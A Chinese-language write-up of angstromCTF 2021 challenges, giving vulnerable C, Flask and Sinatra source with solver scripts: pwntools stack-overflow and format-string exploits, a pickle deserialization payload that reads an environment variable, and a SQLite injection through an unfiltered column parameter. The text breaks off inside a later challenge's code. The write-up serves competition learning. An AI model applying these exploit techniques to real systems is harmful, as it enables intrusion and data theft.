        <content type="html"><![CDATA[<p>记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。<a id="more"></a></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="tranquil"><a href="#tranquil" class="headerlink" title="tranquil"></a>tranquil</h3><p>题目友好给了源码（第一次做外国ctf pwn都这么友好M?）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line">    FILE *file = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fgets(flag, <span class="number">128</span>, file);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! The flag is somewhere else though..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// not so easy for you!</span></span><br><span class="line">    <span class="comment">// win();</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过审计发现题目给了后面函数win()，我们只要bypass <code>strcmp</code>函数即可利用栈溢出来调用win()</p><p>由于<code>strcmp</code>函数只判断到<code>\x00</code>截止，我们可以利用<code>password123%00</code>来bypass。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./tranquil'</span>)</span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21830</span>)</span><br><span class="line"><span class="comment">#process('./tranquil')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'password123'</span>+(<span class="number">0x40</span>-len(<span class="string">'password123'</span>))*<span class="string">'a'</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Sanity-Checks"><a href="#Sanity-Checks" class="headerlink" title="Sanity Checks"></a>Sanity Checks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">int</span> ways_to_leave_your_lover = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> what_i_cant_drive = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_im_walking_out_on_center_circle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> which_highway_to_take_my_telephones_to = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_i_learned_the_truth = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! Let's just do some quick checks to make sure everything's in order..."</span>);</span><br><span class="line">        <span class="keyword">if</span> (ways_to_leave_your_lover == <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (what_i_cant_drive == <span class="number">55</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (when_im_walking_out_on_center_circle == <span class="number">245</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (which_highway_to_take_my_telephones_to == <span class="number">61</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (when_i_learned_the_truth == <span class="number">17</span>) &#123;</span><br><span class="line">                            <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">                            </span><br><span class="line">                            FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">                                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            </span><br><span class="line">                            fgets(flag, <span class="number">128</span>, f);</span><br><span class="line">                            </span><br><span class="line">                            <span class="built_in">printf</span>(flag);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nope, something seems off."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基层上，增加了对4个变量的判断，打开ida发现要判断的4个变量在栈末位，每个占有2个字节于是合理推算栈空间。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21303</span>)</span><br><span class="line"><span class="comment">#process('./checks')</span></span><br><span class="line">e=ELF(<span class="string">'./checks'</span>)</span><br><span class="line">pay=<span class="string">'password123\00'</span>+(<span class="number">0x60</span>-len(<span class="string">'password123\00'</span>)<span class="number">-0x14</span>)*<span class="string">'a'</span>+p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>)</span><br><span class="line"><span class="keyword">print</span> len(p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="stickystacks"><a href="#stickystacks" class="headerlink" title="stickystacks"></a>stickystacks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Secrets</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> secret1[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> birthday[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> ssn[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">&#125; Secrets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">7</span>];</span><br><span class="line">    </span><br><span class="line">    Secrets boshsecrets = &#123;</span><br><span class="line">        .secret1 = <span class="string">"CTFs are fun!"</span>,</span><br><span class="line">        .password= <span class="string">"password123"</span>,</span><br><span class="line">        .birthday = <span class="string">"1/1/1970"</span>,</span><br><span class="line">        .ssn = <span class="string">"123-456-7890"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(&amp;(boshsecrets.flag), <span class="number">128</span>, f);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Name: "</span>);</span><br><span class="line">    </span><br><span class="line">    fgets(name, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome, "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察代码发现<code>printf(name);</code>有格式化字符串漏洞。利用次来找flag。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=ELF('stickystacks')</span></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21820</span>)</span><br><span class="line"><span class="comment">#process('stickystacks')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'%42$p'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Jar（复现）"><a href="#Jar（复现）" class="headerlink" title="Jar（复现）"></a>Jar（复现）</h3><p>题目给了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">'FLAG'</span>, <span class="string">'actf&#123;FAKE_FLAG&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/pickle.jpg')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'pickle.jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span><span class="params">()</span>:</span></span><br><span class="line">contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line"><span class="keyword">return</span> <span class="string">'&lt;form method="post" action="/add" style="text-align: center; width: 100%"&gt;&lt;input type="text" name="item" placeholder="Item"&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style="width: 100%; height: 100%" src="/pickle.jpg"&gt;'</span> + \</span><br><span class="line"><span class="string">''</span>.join(<span class="string">f'&lt;div style="background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;"&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;'</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/add', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line">items.append(request.form[<span class="string">'item'</span>])</span><br><span class="line">response = make_response(redirect(<span class="string">'/'</span>))</span><br><span class="line">response.set_cookie(<span class="string">'contents'</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure><p>通过审计可以发现<code>import pickle</code>，因此可以揣摩是python的反序列化。临时，找了一篇文章：</p><p><a href="https://www.freebuf.com/articles/web/252189.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252189.html</a></p><p>来学习了解python里的反序列化利用。</p><p>但自己在做题时踩一个坑：</p><p><code>if contents: items = pickle.loads(base64.b64decode(contents))    else: items = []</code></p><p><code>items=[]</code>代表返回值为NULL但是<code>items</code>的类型应该还是为<code>list</code>因此我们在构筑payload时应该让其<code>pickle.loads</code>后的类型为<code>list</code>。</p><p>写个脚本构造exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.getenv, (<span class="string">'FLAG'</span>,))</span><br><span class="line"></span><br><span class="line">pickled = pickle.dumps([RCE()])<span class="comment">#注意是个list类型</span></span><br><span class="line">print(base64.b64encode(pickled).decode())</span><br></pre></td></tr></table></figure><p>得到payload转包篡改cookie。</p><p><img src="image-20210411143557147.png" alt="image-20210411143557147"></p><p>得到flag：</p><p><img src="image-20210411143808124.png" alt="image-20210411143808124"></p><p>最后提下，os.getenv可以获得环境变量里的参数。</p><p><img src="image-20210411143857541.png" alt="image-20210411143857541"></p><h3 id="Sea-of-Quills（复现）"><a href="#Sea-of-Quills（复现）" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题也给了源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">@row = db.execute( "select * from quills" )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">erb :quills</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">cols = params[:cols]</span><br><span class="line">lim = params[:limit]</span><br><span class="line">off = params[:offset]</span><br><span class="line"></span><br><span class="line">blacklist = ["-", "/", ";", "'", "\""]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; |word|</span><br><span class="line"><span class="keyword">if</span> cols.include? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">end</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb :specific</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>经过查阅发现是js写的sql查询，其中在’/quills’处没有对我们输入的cols参数进行过滤。</p><p>但做题时，还是技差一筹，百度了<code>sqlite3</code>是js操控Sql一种库，但忘了深入了解SQLite 跟MYSQL一样是一种数据库软件。(默认当sql来做然后原地卒…..)</p><p>于是经过查询查阅资料发现：</p><blockquote><p>SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。每一个 SQLite 数据库都有一个叫 SQLITE_MASTER 的表， 它定义数据库的模式。 </p><p>SQLITE_MASTER的表结构：</p><p>CREATE TABLE sqlite_master ( </p><p>type TEXT, </p><p>name TEXT, </p><p>tbl_name TEXT, </p><p>rootpage INTEGER, </p><p>sql TEXT );<br>原文链接：<a href="https://blog.csdn.net/qq_32572085/article/details/91407057" target="_blank" rel="noopener">https://blog.csdn.net/qq_32572085/article/details/91407057</a></p></blockquote><p>因此我们可以构造payload：</p><p><code>cols=sql from sqlite_master union all select desc</code></p><p>来看数据库中所有表的信息。</p><p><img src="image-20210411153853754.png" alt="image-20210411153853754"></p><p>发现<code>CREATE TABLE flagtable (flag varchar(30))</code> 于是查询flagtable。</p><p><img src="image-20210411154011337.png" alt="image-20210411154011337"></p><h3 id="Sea-of-Quills（复现）-1"><a href="#Sea-of-Quills（复现）-1" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题较上一题多增加了限制：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :server, :puma</span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"><span class="keyword">set</span> :environment, :production</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">@row = db.execute( "select * from quills" )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">erb :quills</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">cols = params[:cols]</span><br><span class="line">lim = params[:limit]</span><br><span class="line">off = params[:offset]</span><br><span class="line"></span><br><span class="line">blacklist = ["-", "/", ";", "'", "\"", "flag"]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; 